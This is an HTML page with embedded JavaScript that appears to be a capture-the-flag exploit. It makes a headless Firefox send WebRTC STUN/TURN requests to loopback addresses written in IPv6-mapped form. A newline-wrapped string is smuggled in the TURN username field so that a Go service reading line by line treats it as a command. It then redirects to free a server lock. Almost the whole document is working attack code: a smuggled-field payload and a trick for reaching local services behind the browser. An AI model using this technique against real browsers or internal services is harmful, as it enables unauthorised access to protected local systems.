<!DOCTYPE html>
<html>
<head>
    <title>Exploit Matrix Final</title>
</head>
<body>
    <h1>Processing network routes...</h1>
    <script>
        // The Go backend splits buffers up to a newline character.
        // Prefixing with a newline drops any residual socket junk to line 1,
        // leaving our target string perfectly clear on line 2.
        const payload = "\ngive me the flag bro\n";

        function firePacket(targetUri) {
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [{
                        urls: targetUri,
                        username: payload,
                        credential: "x"
                    }]
                });
                pc.createDataChannel("trigger");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
            } catch(e) {}
        }

        // We wrap the loopback target inside the IPv6-mapped IPv4 structure [::ffff:127.0.0.1]
        // This forces Firefox's IPv6-preferred stack to execute the raw binding test.
        const vectors = [
            "stun:[::ffff:127.0.0.1]:6767",
            "turn:[::ffff:127.0.0.1]:6767",
            "stun:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767",
            "turn:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767"
        ];

        vectors.forEach((uri, i) => {
            setTimeout(() => firePacket(uri), i * 100);
        });

        // Redirect within 1.5 seconds to exit headless Firefox and release the Go server mutex
        setTimeout(() => {
            window.location.href = "about:blank";
        }, 1500);
    </script>
</body>
</html>
